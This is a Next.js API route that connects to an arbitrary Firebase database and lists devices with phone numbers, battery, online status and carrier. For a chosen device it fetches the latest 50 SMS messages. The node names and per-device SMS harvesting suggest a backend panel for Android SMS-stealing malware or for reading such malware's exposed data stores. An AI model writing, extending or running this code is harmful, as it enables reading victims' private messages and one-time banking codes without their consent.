import { NextResponse } from "next/server";
import {
  fbGet, cleanBase, normalizeDevices, normalizeSms, smsPaths, extractPhone,
} from "@/lib/firebase";

export const dynamic = "force-dynamic";

function mergeById(baseList, extraMap) {
  const map = {};
  for (const d of baseList) map[d.id] = { ...d };
  for (const [id, raw] of Object.entries(extraMap || {})) {
    if (!raw || typeof raw !== "object") continue;
    const phone = extractPhone(raw);
    let battery = null;
    if (raw.battery != null) {
      const n = parseInt(String(raw.battery).replace("%", ""), 10);
      if (!Number.isNaN(n)) battery = n;
    }
    const online = raw.status === true || raw.online === true;
    if (!map[id]) {
      map[id] = {
        id,
        name: id.slice(0, 16),
        phone: phone || "",
        battery,
        online,
        android: "",
        network: raw.network || raw.carrier || "",
      };
    } else {
      if (!map[id].phone && phone) map[id].phone = phone;
      if (map[id].battery == null && battery != null) map[id].battery = battery;
      if (raw.status === true) map[id].online = true;
      if (raw.status === false) map[id].online = false;
    }
  }
  return Object.values(map);
}

export async function POST(req) {
  try {
    const body = await req.json();
    const action = body.action || "devices";
    const base = cleanBase(body.url || "");
    const auth = body.auth || "";
    if (!base.includes("firebaseio.com") && !base.includes("firebasedatabase.app")) {
      const headers = { "Cache-Control": "no-store, max-age=0" };
      return NextResponse.json({ ok: false, error: "Invalid Firebase URL" }, { status: 400 });
    }

    if (action === "ping") {
      const r = await fbGet(base, ".json?shallow=true", auth);
      return NextResponse.json({ ok: r.ok, status: r.status, keys: r.data ? Object.keys(r.data) : [] });
    }

    if (action === "devices") {
      const clients = await fbGet(base, "clients", auth);
      const userData = await fbGet(base, "user_data", auth);
      const allUsers = await fbGet(base, "All_Users", auth);
      const devicesNode = await fbGet(base, "devices", auth);

      let list = [];
      if (clients.ok && clients.data) list = normalizeDevices(clients.data);
      if (userData.ok && userData.data) list = mergeById(list, userData.data);
      if (allUsers.ok && allUsers.data) list = mergeById(list, allUsers.data);
      if (devicesNode.ok && devicesNode.data) list = mergeById(list, devicesNode.data);

      const online = list.filter((d) => d.online).length;
      return NextResponse.json({
        ok: true,
        total: list.length,
        online,
        offline: list.length - online,
        withPhone: list.filter((d) => d.phone).length,
        devices: list,
      });
    }

    if (action === "sms") {
      const deviceId = body.deviceId;
      if (!deviceId) return NextResponse.json({ ok: false, error: "deviceId required" }, { status: 400 });

      let messages = [];
      let used = null;
      let lastError = null;

      for (const p of smsPaths(deviceId)) {
        // CRITICAL: large inboxes (10k+) must use limitToLast
        const limitedPath = `${p}.json?orderBy="$key"&limitToLast=50`.replace(".json.json", ".json");
        // fbGet already adds .json — pass path carefully
        const r = await fbGet(base, `${p}?orderBy="$key"&limitToLast=50`, auth);
        if (r.ok && r.data && typeof r.data === "object" && !Array.isArray(r.data)) {
          const rows = normalizeSms(r.data);
          if (rows.length) {
            messages = rows;
            used = p + " (last 50)";
            break;
          }
        } else if (r.error || r.status) {
          lastError = r.error || `HTTP ${r.status}`;
        }

        // fallback small full node
        const r2 = await fbGet(base, p, auth);
        if (r2.ok && r2.data && typeof r2.data === "object") {
          const rows = normalizeSms(r2.data);
          if (rows.length) {
            messages = rows.slice(0, 50);
            used = p;
            break;
          }
        }
      }

      return NextResponse.json({
        ok: true,
        path: used,
        count: messages.length,
        messages,
        error: messages.length ? null : lastError,
      });
    }

    return NextResponse.json({ ok: false, error: "unknown action" }, { status: 400 });
  } catch (e) {
    return NextResponse.json({ ok: false, error: String(e.message || e) }, { status: 500 });
  }
}
